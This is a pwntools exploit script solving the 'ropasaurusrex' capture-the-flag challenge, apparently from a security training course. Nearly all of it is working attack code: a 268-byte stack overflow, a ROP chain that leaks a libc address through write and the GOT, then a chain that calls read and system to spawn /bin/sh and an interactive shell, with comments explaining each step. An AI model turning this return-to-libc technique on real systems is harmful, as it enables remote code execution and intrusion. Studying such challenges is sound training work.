from pwn import *

# asks for a string and does nothing.
# Libraries are dynamically linked and there is full RELRO, so we have to leak addresses

# the ELF class finds the elf file starting form the executable's path, so if the libc is in another branch of the tree, you have to climb back to the nearest common ancestor directory and then descend to the correct path
LIBC_PATH = "./../../env/libc-2.39.so"
LIBC = ELF(LIBC_PATH, checksec = False)
CHALL_PATH = "./ropasaurusrex_patched"
CHALL = ELF(CHALL_PATH, checksec = False)
COMMANDS = """
c
"""

context.arch = "amd64"

if args.REMOTE :
    c = remote("ropasaurusrex.training.offensivedefensive.it", 8080, ssl = True)
else :
    if args.GDB :
        c = gdb.debug(CHALL_PATH, COMMANDS)
    else :
        c = process(CHALL_PATH)

# cyclic_payload = cyclic(0x200)
# c.recvuntil(b"Input: ")
# c.sendline(cyclic_payload)
# here the program crashes because we overwrote the sRIP, but opening GDB we can see which is the invalid return address, then we copy it and we paste in the terminal cyclic -l <wrong ret addr>, which will give us how precisely many bytes we need to overwrite the sRIP.

# the first payload leaks the address of libc (so of the system)
payload = b"A" * 268
payload += p32(CHALL.plt["write"])
payload += p32(CHALL.symbols["_start"])     
payload += p32(1)                           # stdout for write
payload += p32(CHALL.got["read"])           # we write the plt address of read
payload += p32(4)

c.recvuntil(b"Input: ")
c.sendline(payload)

LIBC.address = u32(c.recv(4)) - LIBC.symbols["read"]    # leaked libc address
print(f"libc_base: " + hex(LIBC.address))

# found looking for "pop" in gadgets.txt (we were looking for "add esp, 0xc; ret;" but we found "add esp, 8; pop ebx; ret;", which does the same exact thing)
ADD_ESP_12 = 0x0804901b

# the first part of the payload prepares the memory for the read of /bin/sh on the stack so when the program returns it is executed
payload = b"A" * 268
payload += p32(LIBC.symbols["read"])
payload += p32(ADD_ESP_12)
payload += p32(0)
payload += p32(0x804c300)   # a random address inside the page allocated for storing the got address (which is almost empty beacuse it only contains the got address)
payload += p32(7)           # the null terminator is already there

# the second part of the payload places the system return address to avoid the program crashing
payload += p32(LIBC.symbols["system"])
payload += p32(0xdeadbeef)
payload += p32(0x804c300)

# Alt:
# payload = b"A" * 268
# payload += p32(LIBC.symbols["system"])
# payload += p32(ADD_ESP_12)
# payload += p32(next(LIBC.search(b"/bin/sh\x00")))
# then there is no c.send(b"/bin/sh") because we already found it in the libc and called it

c.recvuntil(b"Input: ")
c.sendline(payload)
c.send(b"/bin/sh")          # when the read is executed, we can place /bin/sh on the stack, then we call the system and execve starts

c.interactive()